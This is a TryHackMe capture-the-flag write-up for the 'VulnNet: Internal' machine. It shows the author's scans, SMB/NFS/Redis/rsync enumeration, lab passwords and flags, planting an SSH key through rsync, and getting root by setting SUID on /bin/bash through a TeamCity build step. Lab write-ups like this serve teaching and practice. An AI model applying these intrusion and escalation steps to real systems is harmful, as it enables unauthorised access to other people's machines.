Today we have another tryhackme challenge kind of boot2root machine but let's start with easy listed machine named vulnnetinternal.


Main IP :: 10.48.161.20

Let's start with port scanning with nmap.

Nmap scan report for 10.48.161.20
Host is up (0.45s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
111/tcp  open     rpcbind
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
873/tcp  open     rsync
2049/tcp open     nfs
9090/tcp filtered zeus-admin


Let's do service and version detection scan.

Nmap scan report for 10.48.161.20
Host is up, received echo-reply ttl 62 (0.050s latency).
Scanned at 2026-06-21 02:47:03 UTC for 15s

PORT     STATE    SERVICE     REASON         VERSION
22/tcp   open     ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 85:7a:c4:4f:48:e3:d5:6b:ad:2d:73:0e:9a:ce:ab:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCydz4L6UZ3edqn2FCQYd1G5Ha9nM+qOYs2820ZetIPJzA73NnJc2aV2/uDGNt7lakz2+oa+0L1p7EZF3r9UOpAY2dRfjWAiY+HqMU034Sy5dSA39ETIS2WsM8FMA74bUa56hLnBAD/p7jJ3ye4Baj0iS4czWdz6+FxgNzej+E5AeUuzlHG2h5hrRhj4ZVOfWbV/WM92t45LrhcL46BpJ/2mXpivxMTuM9gDQLUgQ4ec81GDB452+mZ25ZwmYJ/oaWC4wm+rF/qY6wcTgkgpSzoEVPKhPQ2QDYlIaUFv/L2vjEozUqlG0hkZSR2G8/F3nWdbHtfPCEsx0GOcXiu+Rgmj0Cj4yhdrCBrgKrjFMSu/fQyOukznZWadbtz/SomtfH1RKktFcMJeI88TmNaZZNJM+RQ2jjoMHwFVQrZtoYZABJ8NwShyJdr8eqNuB5O0yY2DPDe2/+o3skVgGbZwupu3lFJnGyo4wZsKV8WtqxuoOBzANwClX+dycRcbdyvKtk=
|   256 68:60:16:b5:48:0e:ac:c9:6f:72:6a:ef:23:3a:23:11 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMop9PL4R1ylFBk4sJTGvMOZR4M8kAucGFbKUUaRJmUqCU2vCsoD7ZcWYxAC3vjvp7lNVivo+jCv8RMxlMyDsRA=
|   256 4f:71:bb:e9:a4:d3:85:cd:15:81:91:c2:02:e4:b8:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHc+zltWYInlH/8ra4PasAWleiOmthzdDql/Fvaxys1
111/tcp  open     rpcbind     syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34781/tcp   mountd
|   100005  1,2,3      36565/tcp6  mountd
|   100005  1,2,3      49626/udp   mountd
|   100005  1,2,3      56943/udp6  mountd
|   100021  1,3,4      37476/udp   nlockmgr
|   100021  1,3,4      38346/udp6  nlockmgr
|   100021  1,3,4      44047/tcp6  nlockmgr
|   100021  1,3,4      46259/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp  open     netbios-ssn syn-ack ttl 62 Samba smbd 4
873/tcp  open     rsync       syn-ack ttl 62 (protocol version 31)
2049/tcp open     nfs         syn-ack ttl 62 3-4 (RPC #100003)
9090/tcp filtered zeus-admin  no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38322/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 20104/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60447/udp): CLEAN (Failed to receive data)
|   Check 4 (port 33361/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -2s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-21T02:47:15
|_  start_date: N/A
| nbstat: NetBIOS name: IP-10-48-161-20, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   IP-10-48-161-20<00>  Flags: <unique><active>
|   IP-10-48-161-20<03>  Flags: <unique><active>
|   IP-10-48-161-20<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00

So here we have this data.

Let's now start with rpc and smb share based servers


rpcinfo 10.48.161.20 
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.140.183        mountd     superuser
    100005    1    tcp       0.0.0.0.206.105        mountd     superuser
    100005    1    udp6      ::.212.135             mountd     superuser
    100005    1    tcp6      ::.132.235             mountd     superuser
    100005    2    udp       0.0.0.0.173.254        mountd     superuser
    100005    2    tcp       0.0.0.0.177.155        mountd     superuser
    100005    2    udp6      ::.150.232             mountd     superuser
    100005    2    tcp6      ::.173.131             mountd     superuser
    100005    3    udp       0.0.0.0.193.218        mountd     superuser
    100005    3    tcp       0.0.0.0.135.221        mountd     superuser
    100005    3    udp6      ::.222.111             mountd     superuser
    100005    3    tcp6      ::.142.213             mountd     superuser
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    udp       0.0.0.0.8.1            nfs        superuser
    100227    3    udp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 nfs_acl    superuser
    100003    3    udp6      ::.8.1                 nfs        superuser
    100227    3    udp6      ::.8.1                 nfs_acl    superuser
    100021    1    udp       0.0.0.0.146.100        nlockmgr   superuser
    100021    3    udp       0.0.0.0.146.100        nlockmgr   superuser
    100021    4    udp       0.0.0.0.146.100        nlockmgr   superuser
    100021    1    tcp       0.0.0.0.180.179        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.180.179        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.180.179        nlockmgr   superuser
    100021    1    udp6      ::.149.202             nlockmgr   superuser
    100021    3    udp6      ::.149.202             nlockmgr   superuser
    100021    4    udp6      ::.149.202             nlockmgr   superuser
    100021    1    tcp6      ::.172.15              nlockmgr   superuser
    100021    3    tcp6      ::.172.15              nlockmgr   superuser
    100021    4    tcp6      ::.172.15              nlockmgr   superuser
      
      
      
So let's keep with this up and we have rpcinfo we have here.

showmount -e 10.48.161.20               
Export list for 10.48.161.20:
/opt/conf *

so we have this and let's connect it with /opt/conf with mount utility.

ls -lah
total 36K
drwxr-xr-x 9 root root 4.0K Feb  2  2021 .
drwxr-xr-x 3 root root 4.0K Jun 21 02:55 ..
drwxr-xr-x 2 root root 4.0K Feb  2  2021 hp
drwxr-xr-x 2 root root 4.0K Feb  2  2021 init
drwxr-xr-x 2 root root 4.0K Feb  2  2021 opt
drwxr-xr-x 2 root root 4.0K Feb  2  2021 profile.d
drwxr-xr-x 2 root root 4.0K Feb  2  2021 redis
drwxr-xr-x 2 root root 4.0K Feb  2  2021 vim
drwxr-xr-x 2 root root 4.0K Feb  2  2021 wildmidi
                                                                     
┌──(root㉿kali)-[/home/kali/thm/vulnint1/vuln]
└─# mount -t nfs 10.48.161.20:/opt/conf vuln

Now we have connected the vuln port here.

But for me i didn't see things here

smbclient -N //10.48.161.20/shares 
Try "help" to get a list of possible commands.
smb: \> 

back with the smb pentesting and we are in 

smb: \> cd temp\
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 11:45:10 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  services.txt                        \
  
  
So we have service flag now.
THM{0a09d51e488f5fa105d8d866a497440a}


So back with nfs with hints we can see that we have redis file redis.conf available.

cat redis.conf | grep -i pass 
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B65Hx562F@ggAZ@F"
# resync is enough, just passing the portion of data the slave missed while
# Require clients to issue AUTH <PASSWORD> before processing any other
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared

redis-cli -h 10.48.161.20
10.48.161.20:6379> ls
(error) ERR unknown command `ls`, with args beginning with: 
10.48.161.20:6379> info
NOAUTH Authentication required.
10.48.161.20:6379> AUTH B65Hx562F@ggAZ@F
OK
10.48.161.20:6379> 


So we have this all here.

10.48.161.20:6379> KEYS *
1) "tmp"
2) "int"
3) "marketlist"
4) "internal flag"
5) "authlist"
10.48.161.20:6379> get internal flag
(error) ERR wrong number of arguments for 'get' command
10.48.161.20:6379> get "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"


Moving with the user and root flag time now.

10.48.161.20:6379> lrange "authlist" 0 100
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.48.161.20:6379> 


You can read about this more and let's look deeper about it.

Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

which translates too this above.

rsync rsync://rsync-connect@10.48.161.20/files/
Password: 
drwxr-xr-x          4,096 2026/06/21 02:41:26 .
drwxr-xr-x          4,096 2025/06/28 16:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal
drwxr-xr-x          4,096 2026/06/21 02:41:27 ubuntu


with this we can start listing the things let's move deeper for our enumeration.
      
rsync rsync://rsync-connect@10.48.161.20/files/sys-internal/user.txt .
Password: 
                                                                             
┌──(root㉿kali)-[/home/kali/thm/vulnint1]
└─# cat user.txt                 
THM{da7c20696831f253e0afaca8b83c07ab}


we have user.txt now.


 ssh-keygen -o                      
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:V762qg2crYaJIAM6iwyBonb4a/QCnaNXtZaJx+xTeuo root@kali
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|.           .    |
|=      .   o     |
|=.o . = S . .    |
|B+.* o X =   .   |
|==*.+.+o* . o    |
|oo =..o+.= . .   |
|  o.o .E*.o..    |
+----[SHA256]-----+
                                                                             
┌──(root㉿kali)-[/home/kali/thm/vulnint1]
└─# rsync -av id_rsa.pub rsync://rsync-connect@10.48.161.20/files/sys-internal/.ssh/authorized_keys

Password: 
sending incremental file list
rsync: [sender] link_stat "/home/kali/thm/vulnint1/id_rsa.pub" failed: No such file or directory (2)

sent 18 bytes  received 12 bytes  3.16 bytes/sec
total size is 0  speedup is 0.00
rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1338) [sender=3.4.1]
                                                                             
┌──(root㉿kali)-[/home/kali/thm/vulnint1]
└─# rsync -av /root/.ssh/id_ed25519.pub rsync://rsync-connect@10.48.161.20/files/sys-internal/.ssh/authorized_keys 

Password: 
sending incremental file list
id_ed25519.pub

sent 201 bytes  received 35 bytes  67.43 bytes/sec
total size is 91  speedup is 0.39


With this we have sent the file into the ssh system.


ssh -i id_rsa sys-internal@10.10.63.208

now we do with this.

sys-internal@ip-10-48-161-20:~$ whoami
sys-internal
sys-internal@ip-10-48-161-20:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt


Here we have this.

TIME FOR PRIVILEGE ESCALATION::

ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@10.10.94.107

so we will do ssh port forwarding 

Now on localhost and port 8111 we have the teamcity login page.

cat catalina.out | grep token
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)


So with this we are logged into the teamcity dashboard

and then we will create a project 

then after saving all the configuration 

we will go to edit projects -> build steps -> edit command line -> edit command steps chmod /bin/bash and we will see it in the /TeamCity/logs..

And then we will see /bin/bash

 ll /bin/bash 
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash*
sys-internal@ip-10-48-161-20:/TeamCity/logs$ ll /bin/bash 
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash*
sys-internal@ip-10-48-161-20:/TeamCity/logs$ /bin/bash 
bash-5.0$ exit
sys-internal@ip-10-48-161-20:/TeamCity/logs$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
THM{e8996faea46df09dba5676dd271c60bd}


and we have root files.
